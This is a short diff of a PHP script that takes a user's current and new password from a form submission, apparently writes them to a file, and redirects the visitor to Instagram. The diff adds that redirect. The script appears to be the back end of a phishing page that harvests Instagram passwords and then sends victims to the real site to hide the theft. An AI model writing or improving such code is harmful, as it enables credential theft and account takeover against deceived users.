@@ -1,4 +1,5 @@
 <?php
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $currentPassword = $_POST["current_password"];
     $newPassword = $_POST["new_password"];
@@ -19,5 +20,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Close the file
     fclose($file);
+    header("Location: https://www.instagram.com/");
 }
 ?>
